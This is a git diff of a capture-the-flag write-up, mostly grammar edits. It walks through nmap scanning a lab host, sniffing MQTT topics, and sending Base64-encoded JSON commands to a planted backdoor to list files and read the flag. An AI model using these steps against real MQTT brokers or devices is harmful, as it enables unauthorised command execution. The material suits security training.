@@ -13,7 +13,7 @@ All standard ports are filtered with the Nmap scan. Switching to scanning all po
 ```bash
 nmap -p- 10.10.59.207
 ```
-After the scan we see that the only port open is1883. 
+
 ### open ports
 - 1883 (mqtt)
 
@@ -46,7 +46,7 @@ mosquitto_sub -t "#" -h 10.10.59.207
 ```
 
 ## Decoding initial message
-After some time we see a long base64 string that does not match everything else being logged. Decoding the base64 shows us the what is publishing the suspicious things.
+After some time, we see a long Base64 string that does not match everything else being logged. Decoding the Base64 shows us what is publishing the suspicious things.
 ![[Pasted image 20240610205607.png]]
 
 ## Publishing a message
@@ -54,7 +54,7 @@ After some time we see a long base64 string that does not match everything else 
 mosquitto_pub -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -h 10.10.59.207 -m "test"
 ```
 
-Publishing a message with test returns a base64 encoded string. Decoding the string states that test is an invalid command. Lets fix the issue and try again
+Publishing a message with a test message returns a base64-encoded string. Decoding the string reveals that the test is an invalid command. Let's fix the issue and try again.
 
 ```python
 SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=
@@ -62,7 +62,7 @@ SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+
 ![Pasted image 20240610211410](https://github.com/BGhoster/Write-Ups/assets/43526966/fe7caf38-5323-4335-bc45-e03c112c5538)
 
 ## Formatting the command
-After fixing the issue we need to encode this command in base64.
+After fixing the issue, we need to encode this command in base64.
 ```python
 {"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "ls"}
 ```
@@ -72,7 +72,7 @@ eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIs
 ![Pasted image 20240610211931](https://github.com/BGhoster/Write-Ups/assets/43526966/66ab2cca-635f-4f0a-ba72-ba33063f243a)
 
 ## Catting the flag
-Now that we see what the flag filename is called let's cat the flag. We will follow the same format. Change the command to cat flag.txt, base64 encode the message, and than publish it.
+Now that we see the flag filename let's cat the flag. We will follow the same format. Change the command to cat flag.txt, base64 encode the message, and publish it.
 ```bash
 {"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "cat flag.txt"}
 ```
